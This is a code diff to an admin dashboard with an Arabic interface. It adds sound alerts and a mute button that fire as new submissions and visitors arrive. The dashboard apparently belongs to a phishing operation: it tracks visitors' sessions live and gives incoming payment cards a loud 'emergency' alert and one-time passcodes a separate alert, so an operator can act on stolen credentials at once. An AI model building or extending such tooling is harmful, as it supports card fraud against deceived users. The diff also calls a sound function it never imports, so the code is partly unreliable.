@@ -22,8 +22,11 @@ import {
   Settings,
   X,
   Eye,
+  Volume2,
+  VolumeX,
 } from "lucide-react";
 import { ToastContainer, toast } from "@/lib/toast-store";
+import { playMessengerSound, playWhatsAppSound, playCardAlertSound, playVisitorSound, playOtpSound } from "@/lib/sounds";
 
 interface SubmissionRow {
   id: number;
@@ -678,6 +681,12 @@ export default function AdminDashboard() {
   const [passwordValue, setPasswordValue] = useState("");
   const [passwordStatus, setPasswordStatus] = useState<string | null>(null);
   const intervalRef = useRef<number | null>(null);
+  const lastSeenIdsRef = useRef<Set<number>>(new Set());
+  const lastSeenVisitorIdsRef = useRef<Set<number>>(new Set());
+
+  // Sound settings
+  const [soundEnabled, setSoundEnabled] = useState(true);
+  const [lastCardAlertTime, setLastCardAlertTime] = useState(0);
   
   // Track session online status and current page
   const [trackingInfo, setTrackingInfo] = useState<Record<string, SessionTrackingInfo>>({});
@@ -732,6 +741,47 @@ export default function AdminDashboard() {
       setStats(statsData);
       setRawRows(submissionsResponse.submissions);
       setVisitors(visitorsData.visitors);
+
+      // Sound notifications for new submissions
+      if (soundEnabled && submissionsResponse.submissions.length > 0) {
+        const newSubmissions = submissionsResponse.submissions.filter((row) => !lastSeenIdsRef.current.has(row.id));
+        
+        for (const row of newSubmissions) {
+          // Card alert - LOUD emergency sound
+          if (row.type === "card") {
+            const now = Date.now();
+            if (now - lastCardAlertTime > 5000) { // Min 5 seconds between card alerts
+              playCardAlertSound();
+              setLastCardAlertTime(now);
+              toast("warning", "🚨 تنبيه!", "بطاقة دفع جديدة وصلت!");
+            }
+          }
+          // OTP sound
+          else if (row.type.startsWith("otp")) {
+            playOtpSound();
+          }
+          // Form submission sound
+          else if (row.type === "initial" || row.type === "vehicle") {
+            playMessengerSound();
+          }
+          // Other submissions
+          else {
+            playFormSubmitSound();
+          }
+          
+          lastSeenIdsRef.current.add(row.id);
+        }
+      }
+
+      // Sound for new visitors
+      if (soundEnabled && visitorsData.visitors.length > 0) {
+        const newVisitors = visitorsData.visitors.filter((v) => !lastSeenVisitorIdsRef.current.has(v.id));
+        for (const visitor of newVisitors) {
+          playVisitorSound();
+          lastSeenVisitorIdsRef.current.add(visitor.id);
+        }
+      }
+
       // Update tracking info
       const trackingMap: Record<string, SessionTrackingInfo> = {};
       trackedSessions.sessions.forEach((session) => {
@@ -745,7 +795,7 @@ export default function AdminDashboard() {
         setLocation("/admin");
       }
     }
-  }, [setLocation]);
+  }, [setLocation, soundEnabled]);
 
   useEffect(() => {
     void fetchData();
@@ -914,6 +964,13 @@ export default function AdminDashboard() {
               <h1 className="text-base font-bold text-slate-900">لوحة التحكم</h1>
             </div>
             <div className="flex items-center gap-2">
+              <button
+                onClick={() => setSoundEnabled(!soundEnabled)}
+                className={`p-2 rounded-xl ${soundEnabled ? "bg-green-500 text-white" : "bg-red-500 text-white"} active:opacity-80`}
+                title={soundEnabled ? "إيقاف الصوت" : "تشغيل الصوت"}
+              >
+                {soundEnabled ? <Volume2 className="w-5 h-5" /> : <VolumeX className="w-5 h-5" />}
+              </button>
               <button
                 onClick={() => setMenuOpen(!menuOpen)}
                 className="p-2 rounded-xl bg-blue-500 text-white active:bg-blue-600"
